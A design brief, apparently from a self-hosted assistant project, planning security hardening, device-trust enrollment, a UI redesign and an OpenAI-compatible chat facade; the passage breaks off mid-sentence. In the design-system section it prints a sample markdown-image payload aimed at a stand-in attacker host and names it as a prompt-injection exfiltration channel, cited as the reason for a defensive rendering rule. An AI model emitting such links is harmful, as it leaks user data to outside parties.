# Phase 4 — Security baseline, identity, UI renewal, OpenAI facade

> Status: **done (2026-09-27)** — all six branches merged into
> `integ/phase-4` after independent Sonnet 5 review (see "Closeout").
> Originally approved for implementation (2026-09-27) after plan-review
> round 1 (independent Sonnet 5 reviewer — Codex CLI is retired from the
> development workflow): 1 CRITICAL / 3 HIGH / 5 MEDIUM / 2 LOW, all
> incorporated below (see "Plan-review round 1"). Branch 1 was implemented
> in parallel with the review and is consistent with it.
> Parent decisions: ADR-001, ADR-003, ADR-004 + ADR-008 decision 3
> (gate-class vs confirm-class), ADR-005 (`private` contract), ADR-008
> decisions 2 (single owner, device-trust identity) and 6 (facade: chat
> only, low trust), `docs/VISION_FRIDAY_2.md` §0/§2/§5/§6, MASTER_PLAN §AA
> ("Plan audit 2026-09-27", "Phase 4–6 outline") and §O.
> **Precondition:** the Phase 3 closeout (branches 5a, 5, 6, 7, 8) is
> merged and the Phase 3 integration PR (former repository, PR #26) has landed on `main`; Phase 4 branches
> cut from `main`. Phase 3 branch 7 (`feat/p3-harness-ui`, in progress)
> owns the font token + `latin-ext`, the shell height/overflow chain, chat
> error surfaces and post-stream flash, keyboard-reachable cards, the
> harness implementation UI, harness-aware approval cards and the
> Playwright selector fix. This brief builds on those, never re-plans them.

## Goal / value

Turn the working-but-rough daily driver into something the owner can
expose beyond `localhost` and use all day: (1) close every kernel/
security finding of the 2026-09-27 audit; (2) replace email+password
signup/login with device trust (ADR-008 decision 2) and give "high-trust
web channel" a precise, testable definition; (3) renew the UI on the
existing Next.js / Tailwind v4 / shadcn + Radix stack — design system
first, then chat, harness console and a cross-workspace approvals inbox;
(4) ship the OpenAI-compatible facade so Open WebUI-class clients can use
Friday as a low-trust, chat-only secondary channel. Usable outcome
(MASTER_PLAN §AA): "Professional, safely-exposable daily driver."

## Boundary vs existing systems

- **Channel trust is tightened, not replaced.** `request_channel()`
  returns `CHANNEL_WEB` for any `request.auth` that is not a
  `ChannelPrincipal` (`backend/core/channels.py:35-37`) — default-trusted,
  so a future authenticator that forgets its channel silently becomes
  high-trust. Branch 2 flips this to default-deny.
  `approvals.services._check_channel_is_web` (`approvals/services.py:226`)
  keeps its semantics.
- **The approval gate keeps its shape.** No new gated tool; the only
  service changes are an `is_agent` refusal and a recorded request
  channel (branch 1). Harness Gates A/B and Phase 3 branch 6's
  `user_invocable` enforcement stay as shipped; harness/agents back ends
  are untouched (branch 5 is UI plus two read-only approvals queries).
- **PATs stay the low-trust bearer credential** (`accounts/models.py:57`,
  `accounts/authentication.py`); they gain expiry (branch 1) and a `kind`
  (branch 6) but never become an identity or enrollment credential.
- **The BFF contract stays:** browser ↔ Next.js route handlers with
  HttpOnly cookies (`frontend/src/lib/auth-cookies.ts`), Origin +
  Content-Type CSRF checks (`frontend/src/lib/csrf.ts`), Next.js ↔ Django
  with a bearer JWT (`frontend/src/lib/backend-fetch.ts`). Branch 2 adds
  one cookie and changes how the JWT pair is minted, not how it travels.
- **Workspace axis unchanged.** Business tables stay
  `WorkspaceScopedModel`s; the new identity tables (devices, pairing
  codes, remote key) hang off `User`, as `User` itself does.
- **Assistant pipeline reused.** The facade runs `classify_intent` →
  `build_gateway_stream` → reply stream like the web view
  (`assistant/views.py:197-281`) and the Telegram relay
  (`integrations/tasks.py:159-231`); every call still goes through
  `InferenceGateway` and writes `ModelUsage`.

## Open decision resolved (recommended): owner deletes vs gate-class "delete"

MASTER_PLAN §O and ADR-008's 2026-09-27 note flag that the owner deletes
rows over the web channel with no `ApprovalRequest`, while decision 3
lists "delete" as gate-class. Actual code: `memory.services.delete_memory`
hard-deletes **only never-approved suggestions** — approved memories are
archived ("forget", restorable) (`memory/services.py:448-477`);
`knowledge.services.delete_document` (`:232`) and `tasks.services.
delete_task` (`:223`) hard-delete. None of these views is PAT-allowlisted.

**Decision (revised after plan-review round 1, CRITICAL finding): ADR-009
keeps ADR-008's confirm-class definition intact — "reversible,
self-scoped, in-app rows" — and makes the three owner deletes actually
reversible instead of dropping the reversibility criterion.** The draft
reclassified two real hard deletes (documents, tasks) by analogy to the
memory case; that was growth by precedent. Instead:

1. `memory.services.delete_memory` already only hard-deletes
   never-approved suggestions (approved memories are archived and
   restorable) — confirm-class as is.
2. `Document` and `Task` gain soft-delete (`deleted_at`, excluded by
   their managers' default querysets and by `for_actor()` consumers; a
   "Çöp kutusu" view restores them). Deleting becomes a reversible move to
   trash → confirm-class under ADR-008 as written. Embeddings/chunks of a
   trashed document stay but are excluded from retrieval.
3. Permanent purge of trashed rows happens only (a) automatically after
   `TRASH_RETENTION_DAYS` (default 30) — the retention window is part of
   the owner's original, confirmed delete decision and is stated in the
   confirmation dialog — or (b) by an explicit "Kalıcı olarak sil" in the
   trash view, which is **gate-class** (an `ApprovalRequest` for
   `purge_trash`, decided separately).
4. Conditions, enforced in code: human owner (`not actor.is_agent`) over
   `CHANNEL_WEB` (the delete/restore services take a required `channel`
   kwarg, branch 2); an explicit UI confirmation naming the object
   (AlertDialog, branch 5); audited (`*.deleted`, `*.restored`,
   `*.purged`); one workspace's in-app rows only. Machine-initiated
   deletes and anything touching the vault/filesystem, git, an external
   system or a whole workspace stay gate-class. ADR-008's "no growth by
   precedent" holds: ADR-009 adds no new confirm-class *kind* of action,
   it makes these deletes meet the existing definition.

CLAUDE.md rule 4 gets a one-line pointer to ADR-009.

## Scope (one branch each)

### 1. `feat/p4-security-baseline` — close the audit's kernel findings

Every item was re-verified against the code for this brief.

**Stack and secrets.** `deploy/docker/compose.yml` publishes `8001`,
`5433`, `6380`, `9000`, `9001` on all interfaces and commits
`DJANGO_SECRET_KEY: dev-insecure-key-change-me`, `POSTGRES_PASSWORD:
friday`, `MINIO_*`/`MINIO_ROOT_PASSWORD: friday-dev-secret`. Every publish
becomes `127.0.0.1:<port>:…`; secrets become `${VAR:?}` from the
gitignored `deploy/docker/.env`, with a committed
`deploy/docker/.env.example` and a `make secrets` target generating random
values once; Redis gets `--requirepass`; the Telegram fixture values move
to the e2e env only. **MinIO is removed** — service, `MINIO_*` settings
(`config/settings/base.py:103-107`, read nowhere) and the unused
`django-storages`/`boto3` dependencies (`backend/pyproject.toml:13-14`,
never imported); §O's binary-audio decision made it permanently dormant.
A `deploy/docker/compose.daily.yml` override runs `gunicorn config.wsgi
-k gthread` (no WSGI server is a dependency today; `runserver` is not for
exposure), prod settings, and a `frontend` service on `next build && next
start`. The dev stack keeps `runserver` + bind mounts.

**Settings.**
- `base.py:15` falls back to a hard-coded `SECRET_KEY`; the fallback is
  allowed only when `DEBUG`, otherwise `ImproperlyConfigured`.
- `prod.py` is a TODO (`prod.py:5`). It becomes fail-hard (required
  `DJANGO_SECRET_KEY`, `DATABASE_URL`, `DJANGO_ALLOWED_HOSTS`,
  `REDIS_URL`) with secure session/CSRF cookies, nosniff,
  `X_FRAME_OPTIONS="DENY"` and a referrer policy. HSTS and SSL redirect
  are env-driven and **off by default at Django**: Django's only client is
  the BFF over loopback HTTP, so a Django-level redirect would break every
  BFF call. Browser-facing HSTS, `frame-ancestors 'none'`, nosniff and
  referrer policy are set in `frontend/next.config.ts` `headers()` for
  production builds. CI runs `manage.py check --deploy` under prod
  settings with a dummy env.
- `manage.py:9`, `config/wsgi.py:5`, `config/asgi.py:5`,
  `config/celery.py:5` default to `config.settings.dev`; they default to
  `config.settings.prod`, so a missing env fails hard instead of booting
  with `DEBUG=True`. Dev entry points set it explicitly (compose,
  Makefile, `backend/pyproject.toml:47` for pytest).
- No `CACHES`: DRF throttles and the Telegram relay limiter
  (`integrations/tasks.py:56-59`) count per process in LocMem, web and
  worker separately. Add Django's built-in `RedisCache` (`REDIS_CACHE_URL`,
  default `REDIS_URL` db 1; no new dependency); tests keep LocMem.
- `DATABASES["default"]["TEST"]["NAME"]` from `DJANGO_TEST_DATABASE_NAME`,
  so parallel worktree runs against one Postgres stop colliding.

**Owner account and tokens.**
- No `AUTH_PASSWORD_VALIDATORS`: add Django's four (min length 12);
  `bootstrap_owner` (`bootstrap_owner.py:45-50`) only rejects an empty
  password and now runs `validate_password`.
- `SIMPLE_JWT` rotates refresh tokens without a blacklist (`base.py:134-
  139`): install `rest_framework_simplejwt.token_blacklist`, set
  `BLACKLIST_AFTER_ROTATION`, add `POST /api/v1/auth/logout` and call it
  from the BFF logout route (`frontend/src/app/api/auth/logout/route.ts:14`
  notes the backend has none); `flushexpiredtokens` joins beat.
- Throttles (`base.py:130` TODO): `login` and `refresh` scopes. Django's
  `REMOTE_ADDR` is always the BFF, so these are effectively **global**
  rates — correct for a single-account system, and said so in the
  settings comment. A `cost` scope covers unthrottled cost-bearing
  endpoints: agent creation (synchronous planner LLM call,
  `agents/views.py:106-133`, PAT-allowlisted), harness discovery job
  creation (`harness/views.py:152`, up to `HARNESS_MAX_JOB_COST` each) and
  knowledge document creation (embeddings).
- PATs never expire: add `expires_at` (`PAT_DEFAULT_TTL_DAYS=90`, max 365,
  chosen at mint), rejected by `PersonalAccessTokenAuthentication`;
  existing rows backfilled to now + 30 days. `create_dev_pat` writes no
  audit row — it records `accounts.pat.created` with
  `via=management_command`. PAT auth failures are audited (prefix only,
  cache-rate-limited).

**Approvals and export.**
- `approve_request`/`reject_request` (`approvals/services.py:287-360`)
  never check `actor.is_agent`; they refuse an `is_agent` actor with
  `ApprovalPermissionDenied` before the channel check (defense in depth —
  no agent service accounts exist today).
- The create view stamps `origin=HUMAN` for PAT requests
  (`approvals/views.py:124-131`) and `_record` (`approvals/services.py:238`)
  stores no channel. `HUMAN` stays correct (a person typed the CLI
  command); `create_request` gains a required `channel` kwarg, persisted
  as `ApprovalRequest.requested_channel` (existing rows `unknown`) and
  added to every `approval.*` audit row's metadata, decisions included.
  Machine callers pass `system`.
- Vault export writes every approved memory, `private` included, under
  `03_Workspaces/<ws>/Memory/` (`tools/export.py:282`), contradicting
  `docs/memory/obsidian-vault-strategy.md:26` (`_private` is the
  sync-ignored tree). Private memories go to `_private/<ws>/Memory/`; the
  existing conservative prune removes stale main-tree copies next run.

**Config hygiene.**
- `.env.example` misses 21 backend variables read in code:
  `AI_TIMEOUT_CONNECT`, `AI_TIMEOUT_READ`, `AI_MAX_RETRIES`,
  `AI_RETRY_BACKOFF_SECONDS`, the four `KNOWLEDGE_*`,
  `DATA_UPLOAD_MAX_MEMORY_SIZE`, the seven `AGENT_*` knobs,
  `ANTHROPIC_MODEL_ID`, `DEEPSEEK_MODEL_ID`, `OPENAI_MODEL_ID`,
  `OPENAI_EMBEDDING_DIMENSION`, `FRIDAY_OWNER_PASSWORD` — plus the CLI
  client's three `FRIDAY_CLI_*` in a separate block (the `HARNESS_*` block
  is Phase 3 branch 5's). `GEMINI_API_KEY` is read nowhere and is removed.
  New entries are commented-out defaults (an uncommented `KEY=` breaks
  `env.int`). A test scans settings for `env*("NAME"` and fails on any
  name missing from `.env.example`.
- Obsolete TODOs: `pyproject.toml:88` (apps.modules contract → a note that
  it lands with the first module pack), `base.py:103` (goes with MinIO),
  `base.py:130` (resolved), `base.py:205` (dangling comment from the
  removed `DEV_ALLOW_SELF_APPROVAL`), `core/exceptions.py:12`
  `ApprovalRequiredError` (dead code, deleted), `config/urls.py:31` (audit
  admin — dropped; admin bypasses `for_actor()`, as `approvals/admin.py`
  already argues). The structlog TODO (`base.py:428`) is real and stays.

**Tests.** Prod settings import fails without a secret; `check --deploy`
clean in CI; 429 per throttle scope; a blacklisted refresh → 401; an
`is_agent` actor on the web channel → 403 for approve and reject; audit
metadata carries `channel` for web, CLI and system; a private memory lands
only under `_private/` and its old main-tree copy is pruned; an expired
PAT → 401 on every allowlisted view; `bootstrap_owner` rejects a weak
password; `.env.example` completeness.

**Done when:** `docker compose config` publishes nothing outside
`127.0.0.1`; a grep test finds no committed secret literal; prod settings
fail hard and pass `check --deploy`.

### 2. `feat/p4-device-trust` — device enrollment replaces signup/login

**Models (`accounts`).**
- `User.is_owner` (partial unique constraint on `True`). A data migration
  sets it when exactly one non-agent user exists; otherwise
  `manage.py set_owner --email` must run (explicit failure on an
  ambiguous DB). Only the owner can enroll devices, so a stray second
  user (e.g. from `createsuperuser`) never obtains a web session.
- `TrustedDevice`: `user`, `name`, `secret_hash` (sha256 of a 256-bit
  secret, unique), `enrolled_via` (`pin`/`strong_code`/`remote_key`),
  `enrolled_ip`, truncated `user_agent`, `last_seen_at`/`_ip`,
  `revoked_at`, `revoke_reason`. Soft-revoked, never deleted; idle expiry
  `DEVICE_IDLE_EXPIRY_DAYS=90`.
- `DevicePairingCode`: `code_hash`, `kind` (`pin`: 8 digits, 5-minute
  TTL; `strong`: ≥128-bit base32, 30-minute TTL), `attempts` (burned at
  5), `consumed_at`, `issued_by_device` (nullable), `issued_via`.
- `RemoteAccessKey`: at most one active (partial unique), `key_hash`,
  `last_used_at`, `revoked_at`. None by default — remote enrollment is off
  until the owner creates a key.

**Flows.**
- *First device:* `bootstrap_owner --email …`, then
  `issue_pairing_code [--strong]` prints a code once (audited). Host
  shell access is the proof of ownership. The owner opens `/enroll`,
  enters the code and a device name.
- *Further devices:* "Yeni cihaz eşleştir" on a trusted session issues a
  PIN shown once; the new device enters it at `/enroll`.
- *Outside the LAN:* `/enroll` also takes a strong code or the remote key
  (`jrk_…`), created/rotated/revoked from a trusted session or
  `manage.py rotate_remote_key`; reusable until rotated; every use audited
  and surfaced as a "new device enrolled remotely" banner on all devices.
- *Session:* enrollment returns `{device_secret, access, refresh}`. The
  BFF stores `friday_device` (HttpOnly, `Secure` in production,
  `SameSite=Strict`, `path=/api/auth`, 400-day max-age) next to the
  existing JWT cookies. JWTs carry a `did` claim. When refresh fails the
  BFF silently re-mints via `POST /api/v1/auth/devices/session`; only a
  rejected device secret sends the browser to `/enroll`.
- *Revoke:* `POST /api/v1/auth/devices/<id>/revoke` is immediate —
  `DeviceJWTAuthentication` checks the device row on every request (one
  indexed lookup), so outstanding access tokens die with the device.
  "Çıkış" ends the session (blacklist); "Bu cihazı unut" revokes.
  "Immediate" means the next request (plan-review round 1, MEDIUM): an
  already-open chat SSE stream is not re-checked mid-stream; it ends with
  its reply (bounded by the gateway timeout). A test pins that the next
  request after revocation is 401.
- *Existing sessions at the flip:* when this branch deploys, every
  current browser session (JWT without `did`) becomes invalid, including
  the owner's own dev session — the owner re-enters through `/enroll`
  with a code from `manage.py issue_pairing_code`. Stated in the
  deploy notes and the runbook.

**LAN gating.** PINs are accepted only from `DEVICE_PAIRING_NETWORKS`
(loopback, RFC 1918, `fc00::/7`, `100.64.0.0/10` for Tailscale). Django
only sees the BFF's address, so the BFF takes the client IP **only** from
the header named in `TRUSTED_CLIENT_IP_HEADER` (set by the owner's reverse
proxy — never a client-supplied `X-Forwarded-For`) and forwards it as
`X-Friday-Client-IP` with `X-Friday-BFF-Key` (`FRIDAY_BFF_SHARED_SECRET`);
Django ignores the IP header without a valid key. An unknown IP may use a
PIN only if `DEVICE_PAIRING_ALLOW_UNKNOWN_IP` (dev true, prod false).
Strong codes and the remote key work from any network. The LAN check is
defense in depth, not the boundary: codes are issuable only by an
already-trusted principal, single-use, short-lived, attempt-burned and
hashed. **Throttling is two-tier** (plan-review round 1, HIGH): a tight
per-source limit keyed on the BFF-key-validated `X-Friday-Client-IP`
(`ENROLL_RATE_PER_SOURCE`, default 5/10min) plus a much looser global
ceiling (`ENROLL_RATE_GLOBAL`, default 60/hour) — so an internet-side
flood from one source can't exhaust the bucket the owner needs. When no
validated client IP exists (no trusted proxy configured), only the
global ceiling applies; that residual self-DoS risk is accepted and
documented, and the host-shell `issue_pairing_code` path is never
throttled by it.

**Step 0 of this branch — client-IP spike (plan-review round 1, HIGH):**
before any LAN-gating code, record in the brief what a Next.js route
handler actually receives under `next dev`, `next start` and behind the
documented reverse proxy (Caddy) — which header, if any, carries the
socket peer. Two supported outcomes, both specified now: (a) a trusted
proxy sets `X-Real-IP`/`X-Forwarded-For` → `TRUSTED_CLIENT_IP_HEADER`
names it and PIN pairing is LAN-gated; (b) no trustworthy header (bare
`next start`) → PIN pairing is accepted only when
`DEVICE_PAIRING_ALLOW_UNKNOWN_IP=true` (dev default; documented as
"LAN gating off"), and prod setups without a proxy pair devices with
strong codes / `issue_pairing_code` only.

> **Step-0 finding (2026-09-27, Next.js 16.3.6 source,
> `node_modules/next/dist/server/base-server.js` `handleRequestImpl`):**
> a route handler never sees the socket address directly (`NextRequest`
> has no `ip` since Next 15). `next dev` and `next start` share this code
> path and set `x-forwarded-for` from `socket.remoteAddress` **only when
> the request does not already carry one** (`req.headers['x-forwarded-for']
> ??= …`); `x-real-ip` is never touched. So under a bare `next dev` /
> `next start` both headers are client-controlled → outcome (b): the BFF
> forwards no client IP unless `TRUSTED_CLIENT_IP_HEADER` is set, and PINs
> work only with `DEVICE_PAIRING_ALLOW_UNKNOWN_IP=true` (dev default).
> Behind Caddy → outcome (a): `reverse_proxy` with `header_up X-Real-IP
> {remote_host}` overwrites any client value, so `TRUSTED_CLIENT_IP_HEADER=
> X-Real-IP` is trustworthy (Caddy's own `X-Forwarded-For` also works when
> no `trusted_proxies` are configured, since Caddy then replaces a
> client-sent value; the BFF uses the right-most entry of a list-valued
> header). Implemented exactly so in `frontend/src/lib/client-ip.ts`.

**Why not the PAT model for the remote key.** A PAT authenticates API
calls *as a low-trust, workspace-bound channel*; the remote key does the
opposite — it mints a high-trust, workspace-spanning device credential
and authenticates nothing else. One table for both would make "is this
credential low-trust?" depend on a row flag — the bug class the
default-deny flip removes. Separate models and authenticators; only
`hash_token` is shared.

**The high-trust web channel, defined.** A request is `CHANNEL_WEB` iff:
(1) it authenticated through `DeviceJWTAuthentication` (the sole
`DEFAULT_AUTHENTICATION_CLASSES` entry) with a valid access JWT carrying
`did`; (2) `did` names a non-revoked, non-idle-expired `TrustedDevice` of
the token's user; (3) the user is active, `is_owner` and not `is_agent`;
(4) it arrived through the BFF, whose Origin/Content-Type checks are the
CSRF boundary. The authenticator sets `request.auth` to a
`WebSessionPrincipal(device_id)`; `request_channel()` returns
`CHANNEL_WEB` only for that type, the PAT's channel for a
`ChannelPrincipal`, and `CHANNEL_UNKNOWN` (low-trust) otherwise; a JWT
without `did` is rejected. A `core.permissions.IsWebChannel` DRF
permission guards every web-only surface on top of service checks:
approval decisions, PAT mint/revoke, Telegram link codes, pairing codes,
remote key, devices, firm creation, owner deletes, draft confirmation.

**Removals.** `SignupView`/`SignupSerializer`/`auth/signup`
(`accounts/views.py:54-68`, `accounts/urls.py:14`), `SIGNUP_ENABLED`
(`base.py:142`, `dev.py`, `compose.yml`, `.github/workflows/ci.yml:115-
120`), `AuditedLoginView` + `auth/login`; frontend `app/(auth)/signup/`,
`app/(auth)/login/`, `components/auth/{Signup,Login}Form*`,
`app/api/auth/{signup,login}/` — replaced by `/enroll`, `EnrollForm`,
`app/api/auth/enroll/` and `app/api/auth/session/start/`.
`frontend/src/proxy.ts:5-6` guards only `/chat` and `/today`; it guards
every shell route and redirects to `/enroll`.

**e2e.** CI runs `bootstrap_owner --email e2e@example.test --if-absent`;
`frontend/e2e/global-setup.ts` runs `issue_pairing_code --plain` (command
prefix from `E2E_MANAGE_CMD`, so `make up` users can use `docker compose
exec web …`); the smoke enrolls via `/enroll` instead of `/signup`
(`frontend/e2e/smoke.e2e.ts:84`). `SIGNUP_ENABLED` leaves CI.

**Owner-only firm workspace creation.** Today a company workspace can
only be made in Django admin (`workspaces/admin.py`), which the owner
cannot reach (`register_user` creates `is_staff=False`) and which writes
no `workspace.created` audit row. Add `workspaces.services.
create_firm_workspace(actor, name, profile)`: `is_owner` + web channel,
`type=COMPANY`, owner membership, audited like
`ensure_personal_workspace`. `WorkspaceListView` becomes list/create
(`POST /api/v1/workspaces`, profile through the existing dossier
serializer); `PATCH` also accepts `name`. UI: "Yeni firma" dialog from the
workspace switcher; the context refreshes and switches to the new firm.
Firm deletion/archival stays out of scope (gate-class).

**ADR-009** is written here (see "Open decision resolved"): soft-delete
for `Document`/`Task` (`deleted_at` + migration + manager exclusion +
restore service/endpoint + retention purge beat task + gate-class
`purge_trash` tool), and the `channel` kwarg on the delete/restore
services. The trash UI itself lands in branch 5.

**Tests.** Role × endpoint for enroll (anonymous, throttled), session
start, device list/revoke, pairing-code issue, remote key, firm create
and the three deletes — each against owner web session, owner CLI PAT,
non-owner user, `is_agent` user, anonymous. Channel matrix: every
authenticator's `request_channel()`; JWT without `did` → 401; a revoked
device's unexpired access token → 401 immediately; refresh on a revoked
or idle-expired device → 401. Codes: TTL, single use under concurrent
consumption (`select_for_update`), 5-attempt burn, PIN from a non-LAN IP
refused, spoofed `X-Friday-Client-IP` without the key ignored, strong code
accepted anywhere. Isolation: firm creation adds no other membership; a
non-owner cannot enroll. The 13 per-app `auth_client` fixtures built on
`force_authenticate` (e.g. `approvals/tests/test_views.py:52`,
`memory/tests/test_views.py:38`) become one root-`conftest.py`
`web_client` fixture authenticating with a `WebSessionPrincipal` — the
flip and the fixture land in one commit, or those tests silently turn
low-trust — and a test fails if any module still defines or imports the
old per-app `auth_client`/`force_authenticate` helper for web-channel
views (plan-review round 1, LOW). Frontend: `EnrollForm`, BFF cookie
flags/paths, proxy redirects, device list; e2e green without signup.

**Done when:** no signup/login code or route remains; a fresh install is
usable via `bootstrap_owner` + `issue_pairing_code`; the channel matrix
pins the definition above; ADR-009 accepted; `docs/integrations/README.md`
(channel section) and ADR-001's bootstrap note updated.

### 3. `feat/p4-design-system` — tokens, primitives, data layer, shell

**Tokens.** `frontend/src/app/globals.css` is grayscale (`oklch(x 0 0)`)
except `--destructive`, and `app/layout.tsx` hard-codes `className="dark
…"`. Add semantic `--success`/`--warning`/`--info`/`--danger` (each with
`-foreground` and `-muted`), one brand accent for `--primary`/`--ring`,
and a status → token map for every domain status (approval, the 8 harness
pipeline statuses, agent, memory, knowledge ingest, task). Light/dark/
system via `next-themes` (no-flash class strategy, the shadcn
convention); a unit test checks WCAG AA contrast over both palettes.

**Primitives** (`components/ui/`, shadcn CLI on the existing `radix-ui`
package): Badge, AlertDialog, Dialog, Tabs, Tooltip, Toast (`sonner`),
EmptyState, ErrorState (Turkish message, retry, collapsible technical
details), PageHeader, and Markdown (`react-markdown` + `remark-gfm`): no
raw HTML, **no image rendering** (a model-emitted
`![](https://attacker/?q=<data>)` is a known prompt-injection
exfiltration channel), links `rel="noopener noreferrer"`, fenced code
with copy, no syntax highlighting in Phase 4.

**Data layer: TanStack Query v5.** Six components hand-roll the same
useState + ref-guard + `setInterval` poller (`AgentsView`, `AgentDetail`,
`HarnessJobsView`, `HarnessJobDetail`, `ApprovalView`,
`TelegramLinkPanel`) and Phase 3 branch 7 adds more. An in-house hook
would re-implement dedup, stale-while-revalidate, focus refetch,
mutation invalidation and conditional polling — what TanStack Query
ships (`refetchInterval` as a function of the data stops polling once
everything is terminal; no background polling). SWR's mutation/
invalidation story is thinner, and approvals/harness are mutation-heavy.
Query keys start with the workspace id, so a workspace switch never
renders another workspace's cached rows. All pollers migrate;
`apiFetch`'s refresh-once logic (`lib/api-client.ts:40-68`) stays as the
fetcher.

**Live updates: polling, not SSE, in Phase 4.** Django runs WSGI
(gthread after branch 1); one long-lived SSE stream per tab pins a worker
thread, and the BFF would need a resumable streaming proxy. For one
owner, conditional polling plus one cheap `GET /api/v1/activity/summary`
(pending approvals per workspace, live harness/agent counts; web only)
feeding the nav badge is simpler. SSE arrives with the carried-forward
harness log streaming, together with an ASGI server.

**Routed shell.** `SidebarContent.tsx:13-25` is a flat 11-item list.
Groups: *Çalışma* (Sohbet, Onaylar + pending badge, Harness), *Hafıza*
(Hafıza, Bilgi, Görevler, Bugün), *Firma* (Firma dosyası), *Otomasyon*
(Ajanlar), *Ayarlar* (Cihazlar, Entegrasyonlar). Voice leaves the nav
until Phase 6 (route kept). Detail views get routes: `/agents/[agentId]`
here (today `AgentsView.tsx:22` selects via state); harness and approvals
detail routes in branch 5. `WorkspaceProvider` honors `?workspace=<id>`,
so a deep link into another firm switches workspace (with a toast)
instead of 404-ing.

**i18n catalog + error codes.** Six `labels.ts` files and inline strings
become one typed Turkish catalog (`lib/i18n/tr.ts`); no i18n framework
(single locale). Backend: a `core` DRF `EXCEPTION_HANDLER` adds a stable
`code` to every error body (DRF's own codes for validation/auth/
throttle), and the six `_service_error_response` helpers (approvals,
agents, harness, knowledge, memory, tasks views) emit domain codes
(`approval.channel_forbidden`, `approval.expired`, `invalid_transition`,
…); `detail` stays for compatibility. `ApiError` (`lib/api-client.ts:5-13`
uses `body.detail` as its message) resolves `code` through the catalog;
English `detail` shows only in ErrorState's disclosure.

**Tests.** Primitive a11y (AlertDialog focus trap/`role=alertdialog`,
Tooltip keyboard), token contrast, polling stop condition with fake
timers, workspace-key isolation, and code coverage both ways (a backend
test enumerates emitted codes; a frontend test asserts each has a
catalog entry). Backend: handler shape for 400/401/403/404/429; role ×
endpoint for `activity/summary`.

**Done when:** no component polls with `setInterval`; no raw backend
`detail` renders outside the disclosure; both themes pass contrast; nav
grouped with a live approvals badge; agent detail routed.

**Note (plan-review round 1, MEDIUM):** Phase 3 branch 7 already moved
`ApprovalView` and the harness implementation views onto a shared
`usePolling` hook and a `VIEW_SCROLL_ROOT` scroll contract; this branch
migrates the *remaining* hand-rolled polling components onto the query
layer and folds `usePolling`'s visibility/back-off behavior into it.

### 4. `feat/p4-chat-redesign` — chat on the new foundation

- **Markdown** for assistant messages, streaming-safe (an unclosed fence
  renders as code until closed); copy message / copy code.
- **Smart scroll:** `MessageList.tsx:14` scrolls to the end on every
  update. Follow only while the user is within ~80px of the bottom;
  otherwise show a "Yeni mesaj ↓" pill.
- **Stop and recover:** a stop button aborts the fetch; the server
  already persists `partial` on disconnect (`assistant/services.py:417-
  455`, single write site). After any abort or stream error the client
  refetches and reconciles by `message_id`; a partial reply shows "Yanıt
  yarıda kaldı" with retry. Server-side stream resume is a non-goal.
- **Mobile:** conversation list in a Sheet drawer below `md`, sticky
  composer with safe-area insets, autosizing textarea, Enter/Shift+Enter
  with an `isComposing` guard.
- **Conversation management:** rename, mark private via the existing
  one-way `PATCH` (AlertDialog — irreversible), private and channel
  badges (`Message.channel` for CLI/Telegram/facade turns).
- **Sources:** `memories_used`/`chunks_used` render as a collapsible
  "Kaynaklar" list deep-linking into `/memory` and `/knowledge`.
- **Persisted draft reconstruction** (carried-forward MVP 9 item): task
  drafts re-render from the persisted user message's `intent`/
  `intent_payload` (web-channel messages). For idempotent confirmation
  `Task` gains a nullable unique `source_message` FK, set by the existing
  `draft_message_id` path (`tasks/views.py:86`); a confirmed draft shows
  "Görev oluşturuldu" with a link. Tool-request drafts render read-only
  with a pointer to `/approvals` (no provenance for idempotency).

**Tests.** Scroll-follow logic; abort → partial → refetch; markdown
sanitization (script, `javascript:` links, images dropped); drawer at
phone width; draft reconstruction confirmed vs unconfirmed; backend:
second confirm of the same draft → 400, tasks role × endpoint unchanged.

**Done when:** covered in `ChatView` tests, checked at phone width, no
layout jump after a reply completes.

### 5. `feat/p4-console-and-inbox` — harness console, approvals inbox, confirmations

**Harness console.** Routes `/harness` (live + recent discovery and
implementation jobs), `/harness/jobs/[jobId]`,
`/harness/implementations/[jobId]`, `/harness/repos`. Branch 7's
components move onto routes and the new primitives: token-mapped status
Badges, Tabs (Briefing / Plan / Review / Diff / Transcripts), fenced
transcripts keeping the R2 labeling, cancel behind AlertDialog, polling
via the query layer. **Repo registry UI** over the existing
list/create/detail/patch/delete API (`harness/urls.py:12-17`), self-repo
status read-only.

**Approvals inbox.** One inbox across firms: `GET /api/v1/approvals` gains
`scope=all` (web only; a PAT stays forced to its bound workspace by
`scoped_for_actor`, and `for_actor()` still limits rows to memberships),
each row labeled with its workspace. Filters: status, tool, workspace,
origin, requested channel. Per-tool renderers
(`components/approvals/renderers/`: vault export, `harness_implement`,
`harness_push`, generic fallback) over Phase 3's `display_summary`; the
decision dialog states the consequence ("branch `harness/p3-…` will be
pushed to `origin`"); expiry countdown; decided history; an
`/approvals/[requestId]` route (branch 7's `?request=` link redirects).
Keyboard shortcuts navigate only — no single-key approve.

**Confirmations everywhere** (AlertDialog): memory reject/forget/delete,
knowledge delete, task delete (ADR-009 condition 2), PAT revoke, Telegram
unlink, device revoke, remote-key rotate/revoke, harness and agent
cancel, approval reject, conversation mark-private.

**Tests.** Role × endpoint for `scope=all` (owner web: all memberships;
PAT: bound workspace even when `scope=all` is sent; two-user,
two-workspace isolation); renderer selection with generic fallback; each
confirmation blocks its mutation until confirmed.

**Done when:** every destructive action is confirmed; harness/approval
details are deep-linkable; all firms' pending items show on one screen.

### 6. `feat/p4-openai-facade` — `/v1/chat/completions`, chat only

**Surface.** Django `POST /api/v1/openai/chat/completions` and
`GET /api/v1/openai/models` (`integrations/openai_facade.py`), public via
BFF passthrough routes `/v1/chat/completions` and `/v1/models` (client
base URL `https://<host>/v1`). The BFF routes forward `Authorization`,
stream the body, never read or forward cookies and emit no CORS headers
(clients are servers such as Open WebUI's backend).

**Auth, channel, binding.** PAT only. `PersonalAccessToken` gains `kind`
(`cli` default, `openai`); the authenticator maps kind → channel
(`CHANNEL_CLI` / new `CHANNEL_OPENAI`). The facade accepts only `openai`
tokens; the existing PAT-allowlisted views (assistant, agents, approvals)
accept only `cli` tokens — an Open WebUI server's token can never create
agents or approval requests. Web sessions are refused (bearer-only).
`Message.Channel.OPENAI` is added. The workspace is the token's
(`ChannelPrincipal.bound_workspace_id` + `scoped_for_actor`); no request
field can name another. The token form gains a kind selector and a
copyable Open WebUI setup snippet.

**Stateless → conversation mapping.** Clients resend the whole history;
Friday's context comes from server-side history
(`assistant/context.py:build_context`). New `FacadeConversation`
(`WorkspaceScopedModel`): `token`, `conversation`, `anchor_hash` (sha256
over token id + first user message), `user_turn_hashes`. Per request the
